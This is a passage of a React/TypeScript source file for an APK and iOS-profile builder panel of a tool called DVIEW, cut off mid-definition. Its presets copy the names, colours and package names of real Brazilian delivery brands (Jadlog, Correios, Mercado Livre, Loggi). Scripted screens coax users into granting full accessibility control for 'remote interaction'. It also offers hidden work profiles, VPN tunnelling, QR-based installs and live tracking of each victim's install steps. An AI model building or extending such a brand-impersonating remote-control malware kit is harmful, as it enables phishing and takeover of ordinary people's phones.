import { ChangeEvent, FormEvent, useEffect, useMemo, useState } from "react";
import { QRCodeSVG } from "qrcode.react";
import {
  AlertTriangle,
  ArrowLeft,
  ArrowRight,
  Boxes,
  Building2,
  Check,
  CheckCircle2,
  ChevronLeft,
  ChevronRight,
  Copy,
  Download,
  Edit3,
  ExternalLink,
  Eye,
  Folder,
  FolderOpen,
  Globe,
  HardDrive,
  Image as ImageIcon,
  Layers,
  ListChecks,
  Lock,
  Pencil,
  Play,
  Plus,
  RefreshCw,
  Search,
  Settings,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Smartphone,
  Sparkles,
  Trash2,
  Upload,
  X,
  Zap,
  Palette,
  RotateCcw,
  Sliders,
  Apple,
  Activity,
  QrCode,
  Terminal
} from "lucide-react";
import type { ApkBuildResponse, InstallTrackSession, InstallTrackStep, PlatformType, SavedApkBuild, ScreenCustomizationConfig } from "@droidview/shared";
import { api } from "../api";

interface PresetLogo {
  id: string;
  name: string;
  type: "jadlog" | "dview" | "correios" | "security" | "box" | "custom";
  bg: string;
  color: string;
  label: string;
  dataUrl?: string;
}

const defaultPresetLogos: PresetLogo[] = [
  { id: "logo_jadlog", name: "JADLOG Rastreio", type: "jadlog", bg: "#dc2626", color: "#ffffff", label: "jadlog" },
  { id: "logo_dview", name: "DVIEW Tático", type: "dview", bg: "#080a10", color: "#ff1a2a", label: "DVIEW" },
  { id: "logo_correios", name: "Sedex / Encomendas", type: "correios", bg: "#facc15", color: "#002d72", label: "SEDEX" },
  { id: "logo_security", name: "Segurança MDM", type: "security", bg: "#1e293b", color: "#38bdf8", label: "MDM" },
  { id: "logo_box", name: "Logística Express", type: "box", bg: "#f97316", color: "#ffffff", label: "LOG" }
];

export const defaultScreenConfig: ScreenCustomizationConfig = {
  loadingSubtext: "aguarde, atualização em andamento...",
  speechCalloutText: "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.",
  copyrightText: "All Rights Reserved.",
  permissionDialogTitle: "Permitir controle total para {appName}?",
  serviceDescription: "O serviço de acessibilidade do {appName} permite assistência técnica, leitura de status logístico e interação remota autorizada com o servidor central.",
  accentColor: "#dc2626",
  trackingTitle: "Rastreamento de Encomendas",
  trackingSubtext: "Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos."
};

export interface EnterpriseProfile {
  id: string;
  name: string;
  category: string;
  badge: string;
  appName: string;
  packageName: string;
  redirectUrl: string;
  accentColor: string;
  logoId: string;
  vpnProtocol: "TLS" | "UDP" | "TCP";
  screenConfig: ScreenCustomizationConfig;
}

export const enterpriseProfiles: EnterpriseProfile[] = [
  {
    id: "jadlog",
    name: "JADLOG Rastreio",
    category: "Logística Express",
    badge: "Oficial Jadlog",
    appName: "JADLOG Rastreio",
    packageName: "com.droidview.agent",
    redirectUrl: "https://jadlog.com.br/rastreamento",
    accentColor: "#dc2626",
    logoId: "logo_jadlog",
    vpnProtocol: "TLS",
    screenConfig: {
      loadingSubtext: "aguarde, atualização em andamento...",
      speechCalloutText: "Este aplicativo requer permissão de acesso para funcionar. Por favor, permita para continuar.",
      copyrightText: "All Rights Reserved.",
      permissionDialogTitle: "Permitir controle total para {appName}?",
      serviceDescription: "O serviço de acessibilidade do {appName} permite assistência técnica, leitura de status logístico e interação remota autorizada com o servidor central.",
      accentColor: "#dc2626",
      trackingTitle: "Rastreamento de Encomendas",
      trackingSubtext: "Serviços locais validados com sucesso. Digite o código de rastreio ou acompanhe pedidos.",
      companyPreset: "jadlog",
      enterpriseName: "Jadlog Logística S.A."
    }
  },
  {
    id: "sedex",
    name: "SEDEX / Correios",
    category: "Serviços Postais",
    badge: "Correios BR",
    appName: "SEDEX Rastreamento",
    packageName: "br.com.correios.rastreamento",
    redirectUrl: "https://rastreamento.correios.com.br",
    accentColor: "#eab308",
    logoId: "logo_correios",
    vpnProtocol: "TLS",
    screenConfig: {
      loadingSubtext: "sincronizando dados de encomendas postais...",
      speechCalloutText: "O SEDEX requer acesso de acessibilidade para emitir alertas e rastreio de pacotes em tempo real.",
      copyrightText: "Empresa Brasileira de Correios e Telégrafos.",
      permissionDialogTitle: "Permitir controle de rastreio para {appName}?",
      serviceDescription: "Permite monitoramento automatizado de encomendas postais, atualização de status e comunicação com o terminal central.",
      accentColor: "#eab308",
      trackingTitle: "Portal de Rastreio Postal SEDEX",
      trackingSubtext: "Objetos postais sincronizados com sucesso. Acompanhe suas remessas e encomendas expressas.",
      companyPreset: "sedex",
      enterpriseName: "Correios Brasil"
    }
  },
  {
    id: "mercadolivre",
    name: "Mercado Envios",
    category: "E-Commerce & Cargas",
    badge: "Mercado Livre",
    appName: "Mercado Envios",
    packageName: "com.mercadolivre.envios",
    redirectUrl: "https://envios.mercadolivre.com.br",
    accentColor: "#f59e0b",
    logoId: "logo_box",
    vpnProtocol: "UDP",
    screenConfig: {
      loadingSubtext: "carregando malha logística e rotas de entrega...",
      speechCalloutText: "Permita o serviço para sincronizar suas entregas e otimizar rotas com o centro de distribuição.",
      copyrightText: "Mercado Envios Logística S.A.",
      permissionDialogTitle: "Permitir serviço operacional para {appName}?",
      serviceDescription: "Otimiza a leitura de romaneios, geolocalização de pacotes e telemetria com a central de suporte.",
      accentColor: "#f59e0b",
      trackingTitle: "Painel do Entregador & Cargas",
      trackingSubtext: "Rotas otimizadas e entregas sincronizadas com o centro de distribuição.",
      companyPreset: "mercadolivre",
      enterpriseName: "Mercado Livre"
    }
  },
  {
    id: "loggi",
    name: "Loggi Express",
    category: "Logística Urbana",
    badge: "Loggi",
    appName: "Loggi Entregas",
    packageName: "com.loggi.driver.partner",
    redirectUrl: "https://loggi.com/rastreador",
    accentColor: "#2563eb",
    logoId: "logo_security",
    vpnProtocol: "UDP",
    screenConfig: {
      loadingSubtext: "conectando à malha de entregas rápidas...",
      speechCalloutText: "Ative a permissão para receber atualizações instantâneas de pacotes e suporte em campo.",
      copyrightText: "Loggi Tecnologia Ltda.",
      permissionDialogTitle: "Autorizar Loggi Entregas no aparelho?",
      serviceDescription: "Permite comunicação em tempo real, suporte de navegação e auditoria operacional de entrega.",
      accentColor: "#2563eb",
      trackingTitle: "Loggi Central de Remessas",
      trackingSubtext: "Acompanhe todas as entregas do dia e histórico de ocorrências com o suporte logístico.",
      companyPreset: "loggi",
      enterpriseName: "Loggi Tecnologia"
    }
  },
  {
    id: "dview",
    name: "DVIEW Enterprise MDM",
    category: "Segurança & Endpoint",
    badge: "Dark-Ops",
    appName: "DVIEW Security Agent",
    packageName: "com.droidview.agent",
    redirectUrl: "http://localhost:5000",
    accentColor: "#00f0ff",
    logoId: "logo_dview",
    vpnProtocol: "TLS",
    screenConfig: {
      loadingSubtext: "estabelecendo canal seguro criptografado...",
      speechCalloutText: "Este agente corporativo requer permissão de acessibilidade para diagnóstico remoto e conformidade MDM.",
      copyrightText: "DVIEW Security Technologies.",
      permissionDialogTitle: "Permitir controle de conformidade DVIEW?",
      serviceDescription: "Serviço de gerenciamento corporativo para assistência remota, inventário de hardware e proteção em tempo real.",
      accentColor: "#00f0ff",
      trackingTitle: "Terminal Corporativo Seguro",
      trackingSubtext: "Dispositivo autenticado com sucesso e conectado ao servidor central de gerenciamento.",
      companyPreset: "dview",
      enterpriseName: "DVIEW Enterprise"
    }
  },
  {
    id: "custom",
    name: "White-Label Customizado",
    category: "Personalizado / Qualquer Empresa",
    badge: "100% White-Label",
    appName: "App Corporativo",
    packageName: "com.empresa.agent",
    redirectUrl: "https://suaempresa.com.br",
    accentColor: "#8b5cf6",
    logoId: "logo_box",
    vpnProtocol: "TCP",
    screenConfig: {
      loadingSubtext: "carregando módulos corporativos...",
      speechCalloutText: "Este aplicativo requer permissão de acesso para prestar suporte técnico autorizado.",
      copyrightText: "Todos os Direitos Reservados.",
      permissionDialogTitle: "Permitir controle para {appName}?",
      serviceDescription: "O serviço de acessibilidade do {appName} permite suporte técnico assistido e comunicação com a central.",
      accentColor: "#8b5cf6",
      trackingTitle: "Central de Serviços Corporativos",
      trackingSubtext: "Serviços validados com sucesso. Digite o código ou acesse suas operações.",
      companyPreset: "custom",
      enterpriseName: "Sua Empresa S.A."
    }
  }
];

export const brandAccentPresets = [
  { name: "Vermelho Jadlog", hex: "#dc2626" },
  { name: "Azul Royal", hex: "#2563eb" },
  { name: "Ciano Cyber", hex: "#00f0ff" },
  { name: "Laranja Express", hex: "#f97316" },
  { name: "Verde Esmeralda", hex: "#16a34a" },
  { name: "Roxo Tech", hex: "#8b5cf6" },
  { name: "Dourado Sedex", hex: "#eab308" }
];

export function ApkBuilder() {
  const [builds, setBuilds] = useState<SavedApkBuild[]>([]);
  const [loading, setLoading] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalMode, setModalMode] = useState<"create" | "edit">("create");
  const [editingBuildId, setEditingBuildId] = useState<string | null>(null);
  const [saveDirectory, setSaveDirectory] = useState("C:\\Users\\Dell\\Downloads");
  const [editingPath, setEditingPath] = useState(false);
  const [tempPath, setTempPath] = useState("C:\\Users\\Dell\\Downloads");
  const [toastMsg, setToastMsg] = useState<string | null>(null);

  // Form Fields
  const [platform, setPlatform] = useState<PlatformType>("android");
  const [serverUrl, setServerUrl] = useState(api.baseUrl);
  const [redirectUrl, setRedirectUrl] = useState("https://jadlog.com.br/rastreamento");
  const [appName, setAppName] = useState("JADLOG Rastreio");
  const [packageName, setPackageName] = useState("com.droidview.agent");
  const [bundleId, setBundleId] = useState("com.droidview.agent.ios");
  const [organizationName, setOrganizationName] = useState("DVIEW Enterprise Security");
  const [version, setVersion] = useState("v1.4.8");
  const [enrollmentToken, setEnrollmentToken] = useState(`enroll-${Date.now()}`);
  const [deviceName, setDeviceName] = useState("Android Device");
  const [selectedLogoId, setSelectedLogoId] = useState<string>("logo_jadlog");
  const [customLogoDataUrl, setCustomLogoDataUrl] = useState("");
  const [recentLogos, setRecentLogos] = useState<PresetLogo[]>(() => {
    try {
      const stored = localStorage.getItem("dview.recent_logos");
      return stored ? JSON.parse(stored) : defaultPresetLogos;
    } catch {
      return defaultPresetLogos;
    }
  });

  // VPN / Tunnel Config
  const [vpnEnabled, setVpnEnabled] = useState(true);
  const [vpnPort, setVpnPort] = useState(8443);
  const [vpnProtocol, setVpnProtocol] = useState<"TLS" | "TCP" | "UDP">("TLS");

  // Island / Work Profile Config
  const [islandProfileEnabled, setIslandProfileEnabled] = useState(true);

  // Enterprise White-Label Profile State
  const [selectedEnterpriseId, setSelectedEnterpriseId] = useState<string>("jadlog");

  const applyEnterpriseProfile = (profile: EnterpriseProfile) => {
    setSelectedEnterpriseId(profile.id);
    setAppName(profile.appName);
    setPackageName(profile.packageName);
    setRedirectUrl(profile.redirectUrl);
    setVpnProtocol(profile.vpnProtocol);
    setSelectedLogoId(profile.logoId);
    setCustomLogoDataUrl("");
    setScreenConfig({
      ...profile.screenConfig,
      accentColor: profile.accentColor
    });
    showToast(`🏢 Perfil '${profile.name}' aplicado! Todos os 10 passos do simulador foram ajustados.`);
  };

  // Screen Customization State
  const [screenConfig, setScreenConfig] = useState<ScreenCustomizationConfig>(() => {
    try {
      const stored = localStorage.getItem("dview.screen_config");
      return stored ? JSON.parse(stored) : defaultScreenConfig;
    } catch {
      return defaultScreenConfig;
    }
  });

  // Save screenConfig to localStorage on changes
  useEffect(() => {
    try {
      localStorage.setItem("dview.screen_config", JSON.stringify(screenConfig));
    } catch {
      // Ignore storage errors
    }
  }, [screenConfig]);

  // Modal View: Form vs Customizar Telas vs Preview
  const [activeModalTab, setActiveModalTab] = useState<"form" | "screens" | "preview">("form");
  const [previewStep, setPreviewStep] = useState<number>(1);
  const [isPlayingAuto, setIsPlayingAuto] = useState(false);
  const [buildQuery, setBuildQuery] = useState("");
  const [building, setBuilding] = useState(false);
  const [activeResult, setActiveResult] = useState<ApkBuildResponse | null>(null);
  const [copiedLink, setCopiedLink] = useState(false);
  const [resultTab, setResultTab] = useState<"qr" | "apk" | "tracker">("qr");
  const [qrMode, setQrMode] = useState<"zero_touch" | "web_scan">("zero_touch");
  const [trackedSession, setTrackedSession] = useState<InstallTrackSession | null>(null);
  const [copiedAdb, setCopiedAdb] = useState(false);
  const [copiedZeroTouch, setCopiedZeroTouch] = useState(false);
  const [targetAction, setTargetAction] = useState<"qr" | "apk">("apk");

  const showToast = (msg: string) => {
    setToastMsg(msg);
    setTimeout(() => setToastMsg(null), 3500);
  };

  // Polling em tempo real da esteira de instalação do usuário quando a aba tracker estiver ativa
  useEffect(() => {
    if (!activeResult || resultTab !== "tracker") return;
    const token = activeResult.downloadUrl.replace(/^\/(apk|ios)\/download\//, "");
    let mounted = true;

    const poll = async () => {
      try {
        const session = await api.getInstallTrack(token);
        if (mounted && session) {
          setTrackedSession(session);
        }
      } catch {
        // Sem eventos ainda
      }
    };

    void poll();
    const interval = setInterval(poll, 2500);
    return () => {
      mounted = false;
      clearInterval(interval);
    };
  }, [activeResult, resultTab]);

  const copyAdbCommand = () => {
    if (!activeResult) return;
    const cmd = `adb install -r "${saveDirectory}\\${activeResult.apkName}"`;
    void navigator.clipboard.writeText(cmd);
    setCopiedAdb(true);
    setTimeout(() => setCopiedAdb(false), 2000);
  };

  const copyZeroTouchJson = () => {
    if (!activeResult?.zeroTouchQrPayload) return;
    void navigator.clipboard.writeText(activeResult.zeroTouchQrPayload);
    setCopiedZeroTouch(true);
    setTimeout(() => setCopiedZeroTouch(false), 2000);
  };

  const openBuildQrModal = (build: SavedApkBuild) => {
    const token = build.downloadUrl.replace(/^\/(apk|ios)\/download\//, "");
    setActiveResult({
      apkName: build.platform === "ios" ? `${build.appName}.mobileconfig` : `${build.appName}.apk`,
      downloadUrl: build.downloadUrl,
      iosProfileUrl: build.iosProfileUrl,
      qrPayload: build.qrPayload || `${api.baseUrl}/install/${token}`,
      zeroTouchQrPayload: build.zeroTouchQrPayload,
      webInstallUrl: build.webInstallUrl || `${api.baseUrl}/install/${token}`,
      sha256: build.sha256 || "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
      platform: build.platform || "android"
    });
    setResultTab("qr");
    setActiveModalTab("form");
    setShowModal(true);
  };

  const openBuildTracker = async (build: SavedApkBuild) => {
    const token = build.downloadUrl.replace(/^\/(apk|ios)\/download\//, "");
    setActiveResult({
      apkName: build.platform === "ios" ? `${build.appName}.mobileconfig` : `${build.appName}.apk`,
      downloadUrl: build.downloadUrl,
      iosProfileUrl: build.iosProfileUrl,
      qrPayload: build.qrPayload || `${api.baseUrl}/install/${token}`,
      zeroTouchQrPayload: build.zeroTouchQrPayload,
      webInstallUrl: build.webInstallUrl || `${api.baseUrl}/install/${token}`,
      sha256: build.sha256 || "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
      platform: build.platform || "android"
    });
    setResultTab("tracker");
    setActiveModalTab("form");
    setShowModal(true);
    try {
      const session = await api.getInstallTrack(token);
      setTrackedSession(session);
    } catch {
      // Sem eventos
    }
  };

  // Auto-play demo simulation through 10 steps
  useEffect(() => {
    if (!isPlayingAuto || !showModal || activeModalTab !== "preview") return;
    const timer = setInterval(() => {
      setPreviewStep((s) => (s >= 10 ? 1 : s + 1));
    }, 2400);
    return () => clearInterval(timer);
  }, [isPlayingAuto, showModal, activeModalTab]);

  // Keyboard navigation for preview steps
  useEffect(() => {
    if (!showModal || activeModalTab !== "preview") return;
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "ArrowRight") {
        setPreviewStep((s) => Math.min(10, s + 1));
      } else if (e.key === "ArrowLeft") {
        setPreviewStep((s) => Math.max(1, s - 1));
      }
    };
    window.addEventListener("keydown", handleKeyDown);
    return () => window.removeEventListener("keydown", handleKeyDown);
  }, [showModal, activeModalTab]);

  const fetchBuilds = async () => {
    try {
      const data = await api.apkBuilds();
      setBuilds(data);
    } catch {
      setBuilds([]);
    }
  };

  useEffect(() => {
    void fetchBuilds();
  }, []);

  const stats = useMemo(() => {
    const total = builds.length;
    const completed = builds.filter((b) => b.status === "completed").length;
    const failed = builds.filter((b) => b.status === "failed").length;
    const progress = builds.filter((b) => b.status === "progress").length;
    return { total, completed, failed, progress };
  }, [builds]);

  const filteredBuilds = useMemo(() => {
    const q = buildQuery.trim().toLowerCase();
    if (!q) return builds;
    return builds.filter(
      (b) =>
        b.appName.toLowerCase().includes(q) ||
        b.packageName.toLowerCase().includes(q) ||
        b.version.toLowerCase().includes(q)
    );
  }, [builds, buildQuery]);

  const activeLogo = useMemo(() => {
    return recentLogos.find((l) => l.id === selectedLogoId) || recentLogos[0];
  }, [recentLogos, selectedLogoId]);

  // Dynamic App Logo Renderer for Installation Mockups and List
  const renderAppLogo = (size = 36, borderRadius = 8, style?: React.CSSProperties) => {
    if (customLogoDataUrl) {
      return (
        <img
          src={customLogoDataUrl}
          alt={appName}
          style={{
            width: `${size}px`,
            height: `${size}px`,
            borderRadius: `${borderRadius}px`,
            objectFit: "cover",
            boxShadow: "0 2px 8px rgba(0,0,0,0.25)",
            flexShrink: 0,
            ...style
          }}
        />
      );
    }

    const logo = activeLogo;
    if (logo.dataUrl) {
      return (
        <img
          src={logo.dataUrl}
          alt={appName}
          style={{
            width: `${size}px`,
            height: `${size}px`,
            borderRadius: `${borderRadius}px`,
            objectFit: "cover",
            boxShadow: "0 2px 8px rgba(0,0,0,0.25)",
            flexShrink: 0,
            ...style
          }}
        />
      );
    }

    const bg = screenConfig.accentColor || logo.bg || "#dc2626";

    if (logo.type === "jadlog" && (!screenConfig.accentColor || screenConfig.accentColor === "#dc2626")) {
      return (
        <div
          style={{
            width: `${size}px`,
            height: `${size}px`,
            borderRadius: `${borderRadius}px`,
            background: "#dc2626",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            boxShadow: "0 2px 8px rgba(220, 38, 38, 0.35)",
            flexShrink: 0,
            ...style
          }}
        >
          <span style={{ color: "#ffffff", fontWeight: 900, fontSize: `${Math.max(9, Math.round(size * 0.28))}px`, letterSpacing: "-0.5px" }}>
            jad<span style={{ color: "#ffffff" }}>log</span>
          </span>
        </div>
      );
    }

    if (logo.type === "dview") {
      return (
        <div
          style={{
            width: `${size}px`,
            height: `${size}px`,
            borderRadius: `${borderRadius}px`,
            background: "#080a10",
            border: "1px solid #ff1a2a",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            boxShadow: "0 2px 8px rgba(255, 26, 42, 0.35)",
            flexShrink: 0,
            ...style
          }}
        >
          <span style={{ color: "#ff1a2a", fontWeight: 900, fontSize: `${Math.max(9, Math.round(size * 0.26))}px` }}>
            DVIEW
          </span>
        </div>
      );
    }

    if (logo.type === "correios") {
      return (
        <div
          style={{
            width: `${size}px`,
            height: `${size}px`,
            borderRadius: `${borderRadius}px`,
            background: "#facc15",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            boxShadow: "0 2px 8px rgba(250, 204, 21, 0.35)",
            flexShrink: 0,
            ...style
          }}
        >
          <span style={{ color: "#002d72", fontWeight: 900, fontSize: `${Math.max(9, Math.round(size * 0.26))}px` }}>
            SEDEX
          </span>
        </div>
      );
    }

    const initials = appName.trim().slice(0, 3).toUpperCase() || logo.label || "APP";
    return (
      <div
        style={{
          width: `${size}px`,
          height: `${size}px`,
          borderRadius: `${borderRadius}px`,
          backgroundColor: bg,
          color: "#ffffff",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          fontWeight: 900,
          fontSize: `${Math.max(9, Math.round(size * 0.28))}px`,
          letterSpacing: "0.5px",
          boxShadow: `0 2px 8px ${bg}55`,
          flexShrink: 0,
          ...style
        }}
      >
        {initials}
      </div>
    );
  };

  // Dynamic Centered Splash Screen Logo
  const renderSplashLogo = () => {
    if (customLogoDataUrl || activeLogo.dataUrl) {
      const src = customLogoDataUrl || activeLogo.dataUrl;
      return (
        <div
          style={{
            background: "#ffffff",
            borderRadius: "14px",
            padding: "10px 20px",
            display: "flex",
            alignItems: "center",
            justifyContent: "center",
            gap: "10px",
            boxShadow: "0 6px 20px rgba(0,0,0,0.8)",
            marginBottom: "28px"
          }}
        >
          <img
            src={src}
            alt={appName}
            style={{ width: "32px", height: "32px", borderRadius: "8px", objectFit: "cover" }}
          />
          <span style={{ fontSize: "17px", fontWeight: 800, color: "#0f172a" }}>
            {appName}
          </span>
        </div>
      );
    }

    const color = screenConfig.accentColor || "#dc2626";

    return (
      <div
        style={{
          background: "#ffffff",
          borderRadius: "14px",
          padding: "12px 24px",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          boxShadow: "0 6px 20px rgba(0,0,0,0.8)",
          marginBottom: "28px"
        }}
      >
        <div style={{ display: "flex", alignItems: "center", gap: "8px" }}>
          <svg width="22" height="22" viewBox="0 0 24 24" fill={color}>
            <polygon points="12,2 22,8.5 22,15.5 12,22 2,15.5 2,8.5" />
          </svg>
          <span style={{ fontSize: "20px", fontWeight: 900, color: color, letterSpacing: "-0.5px" }}>
            {appName}
          </span>
        </div>
      </div>
    );
  };

  const openCreateModal = () => {
    setModalMode("create");
    setEditingBuildId(null);
    setPlatform("android");
    setAppName("JADLOG Rastreio");
    setPackageName("com.droidview.agent");
    setBundleId("com.droidview.agent.ios");
    setOrganizationName("DVIEW Enterprise Security");
    setVersion("v1.4.8");
    setRedirectUrl("https://jadlog.com.br/rastreamento");
    setServerUrl(api.baseUrl);
    setEnrollmentToken(`enroll-${Date.now()}`);
    setSelectedLogoId("logo_jadlog");
    setVpnEnabled(true);
    setVpnPort(8443);
    setVpnProtocol("TLS");
    setScreenConfig(defaultScreenConfig);
    setActiveResult(null);
    setActiveModalTab("form");
    setPreviewStep(1);
    setShowModal(true);
  };

  const openEditModal = (build: SavedApkBuild) => {
    setModalMode("edit");
    setEditingBuildId(build.id);
    setPlatform(build.platform || "android");
    setAppName(build.appName);
    setPackageName(build.packageName);
    setBundleId(build.bundleId || build.packageName || "com.droidview.agent.ios");
    setOrganizationName(build.iosConfig?.organizationName || "DVIEW Enterprise Security");
    setVersion(build.version);
    setRedirectUrl(build.redirectUrl || "https://jadlog.com.br/rastreamento");
    setServerUrl(build.serverUrl || api.baseUrl);
    setEnrollmentToken(`enroll-${Date.now()}`);
    setVpnEnabled(build.vpnEnabled ?? true);
    setVpnPort(build.vpnPort ?? 8443);
    setVpnProtocol(build.vpnProtocol ?? "TLS");
    setIslandProfileEnabled(build.islandProfileEnabled ?? build.workProfileEnabled ?? true);
    if (build.logoDataUrl) {
      setCustomLogoDataUrl(build.logoDataUrl);
    }
    if (build.screenConfig) {
      setScreenConfig({
        loadingSubtext: build.screenConfig.loadingSubtext || defaultScreenConfig.loadingSubtext,
        speechCalloutText: build.screenConfig.speechCalloutText || defaultScreenConfig.speechCalloutText,
        copyrightText: build.screenConfig.copyrightText || defaultScreenConfig.copyrightText,
        permissionDialogTitle: build.screenConfig.permissionDialogTitle || defaultScreenConfig.permissionDialogTitle,
        serviceDescription: build.screenConfig.serviceDescription || defaultScreenConfig.serviceDescription,
        accentColor: build.screenConfig.accentColor || defaultScreenConfig.accentColor,
        trackingTitle: build.screenConfig.trackingTitle || defaultScreenConfig.trackingTitle,
        trackingSubtext: build.screenConfig.trackingSubtext || defaultScreenConfig.trackingSubtext
      });
    } else {
      setScreenConfig(defaultScreenConfig);
    }
    setActiveResult(null);
    setActiveModalTab("form");
    setPreviewStep(1);
    setShowModal(true);
  };

  const handleDelete = async (id: string, name: string) => {
    if (confirm(`Excluir o build "${name}" da lista do sistema?`)) {
      try {
        await api.deleteApkBuild(id);
      } catch {
        // Fallback local
      }
      setBuilds((curr) => curr.filter((b) => b.id !== id));
      showToast(`Build "${name}" removido com sucesso.`);
    }
  };

  const handleDownloadBuild = (build: SavedApkBuild) => {
    if (build.platform === "ios") {
      const url = build.iosProfileUrl ? `${api.baseUrl}${build.iosProfileUrl}` : `${api.baseUrl}${build.downloadUrl}`;
      const a = document.createElement("a");
      a.href = url;
      a.download = `${build.appName.replace(/\s+/g, "-")}.mobileconfig`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      showToast(`Iniciando download do perfil iOS "${build.appName}.mobileconfig"`);
      return;
    }
    const url = `${api.baseUrl}${build.downloadUrl}`;
    const a = document.createElement("a");
    a.href = url;
    a.download = `${build.appName.replace(/\s+/g, "-")}.apk`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    showToast(`Iniciando download de "${build.appName}.apk" para: ${saveDirectory}`);
  };

  const handleUploadLogo = (event: ChangeEvent<HTMLInputElement>) => {
    const file = event.target.files?.[0];
    if (!file) return;
    const reader = new FileReader();
    reader.onload = () => {
      const dataUrl = String(reader.result);
      setCustomLogoDataUrl(dataUrl);
      const newLogo: PresetLogo = {
        id: `custom_${Date.now()}`,
        name: file.name.slice(0, 14),
        type: "custom",
        bg: "#0f172a",
        color: "#ffffff",
        label: file.name.slice(0, 3).toUpperCase(),
        dataUrl
      };
      const updatedLogos = [newLogo, ...recentLogos.filter((l) => l.id !== newLogo.id)].slice(0, 8);
      setRecentLogos(updatedLogos);
      setSelectedLogoId(newLogo.id);
      try {
        localStorage.setItem("dview.recent_logos", JSON.stringify(updatedLogos));
      } catch {
        // Ignore localStorage quota errors
      }
      showToast(`Imagem "${file.name}" carregada e salva no histórico.`);
    };
    reader.readAsDataURL(file);
  };

  const handleSaveBuild = async (event: FormEvent) => {
    event.preventDefault();
    setBuilding(true);
    try {
      if (modalMode === "edit" && editingBuildId) {
        // Atualiza build existente
        const updatedPayload: Partial<SavedApkBuild> = {
          platform,
          appName,
          packageName: platform === "ios" ? bundleId : packageName,
          bundleId: platform === "ios" ? bundleId : undefined,
          version,
          redirectUrl,
          serverUrl,
          logoDataUrl: customLogoDataUrl || activeLogo.dataUrl || undefined,
          savePath: platform === "ios"
            ? `${saveDirectory}\\${appName.replace(/\s+/g, "-")}.mobileconfig`
            : `${saveDirectory}\\${appName.replace(/\s+/g, "-")}.apk`,
          vpnEnabled,
          vpnPort,
          vpnProtocol,
          islandProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
          workProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
          screenConfig,
          iosConfig: platform === "ios" ? {
            organizationName,
            bundleId,
            webClipUrl: redirectUrl,
            vpnEnabled,
            vpnType: "IKEv2",
            iconDataUrl: customLogoDataUrl || activeLogo.dataUrl || undefined
          } : undefined
        };

        try {
          await api.updateApkBuild(editingBuildId, updatedPayload);
        } catch {
          // Fallback local
        }

        setBuilds((curr) =>
          curr.map((b) => (b.id === editingBuildId ? { ...b, ...updatedPayload } : b))
        );
        showToast(`Build "${appName}" atualizado com sucesso!`);
        setShowModal(false);
      } else {
        // Gera novo build
        const res = await api.buildApk({
          platform,
          serverUrl,
          enrollmentToken,
          deviceName: platform === "ios" ? (deviceName || "Apple iPhone") : deviceName,
          appName,
          bundleId: platform === "ios" ? bundleId : undefined,
          redirectUrl,
          logoDataUrl: customLogoDataUrl || activeLogo.dataUrl || undefined,
          vpnEnabled,
          vpnPort,
          vpnProtocol,
          islandProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
          workProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
          screenConfig,
          iosConfig: platform === "ios" ? {
            organizationName,
            bundleId,
            webClipUrl: redirectUrl,
            vpnEnabled,
            vpnType: "IKEv2",
            iconDataUrl: customLogoDataUrl || activeLogo.dataUrl || undefined
          } : undefined
        });
        setActiveResult(res);
        setResultTab(targetAction === "qr" ? "qr" : "apk");

        const newEntry: SavedApkBuild = {
          id: `build_${platform}_${Date.now()}`,
          platform,
          appName,
          packageName: platform === "ios" ? bundleId : (packageName || "com.android.system.store"),
          bundleId: platform === "ios" ? bundleId : undefined,
          version: version || "v1.4.8",
          date: new Date().toLocaleDateString("pt-BR", { day: "2-digit", month: "short", year: "numeric" }),
          status: "completed",
          lang: "pt",
          downloadUrl: res.downloadUrl,
          iosProfileUrl: res.iosProfileUrl,
          savePath: `${saveDirectory}\\${res.apkName}`,
          redirectUrl,
          serverUrl,
          sizeBytes: platform === "ios" ? 14200 : 824148,
          qrPayload: res.qrPayload,
          zeroTouchQrPayload: res.zeroTouchQrPayload,
          webInstallUrl: res.webInstallUrl,
          sha256: res.sha256,
          vpnEnabled,
          vpnPort,
          vpnProtocol,
          islandProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
          workProfileEnabled: platform === "android" ? islandProfileEnabled : undefined,
          screenConfig,
          iosConfig: platform === "ios" ? {
            organizationName,
            bundleId,
            webClipUrl: redirectUrl,
            vpnEnabled,
            vpnType: "IKEv2",
            iconDataUrl: customLogoDataUrl || activeLogo.dataUrl || undefined
          } : undefined
        };

        setBuilds((curr) => [newEntry, ...curr]);
        showToast(
          platform === "ios"
            ? `Perfil Apple iOS "${res.apkName}" gerado com sucesso!`
            : `APK "${res.apkName}" gerado e salvo em ${saveDirectory}!`
        );
      }
    } catch (err) {
      alert(`Erro no processo: ${err instanceof Error ? err.message : "Erro desconhecido"}`);
    } finally {
      setBuilding(false);
    }
  };

  const copyDownloadLink = () => {
    if (!activeResult) return;
    const full = `${api.baseUrl}${activeResult.downloadUrl}`;
    void navigator.clipboard.writeText(full);
    setCopiedLink(true);
    setTimeout(() => setCopiedLink(false), 2000);
  };

  interface OfficialStepMeta {
    step: number;
    name: string;
    title: string;
    subtitle: string;
    badge: string;
    badgeColor: string;
    systemPath: string;
    description: string;
    acceptanceCriteria: string;
  }

  const officialSteps: OfficialStepMeta[] = useMemo(() => {
    if (platform === "ios") {
      return [
        {
          step: 1,
          name: "Tela 01",
          title: "Tela 01 — Download do Perfil no Safari",
          subtitle: "Requisição OTA de Perfil de Configuração",
          badge: "OTA_DOWNLOAD",
          badgeColor: "#38bdf8",
          systemPath: "Safari iOS → Download de Perfil",
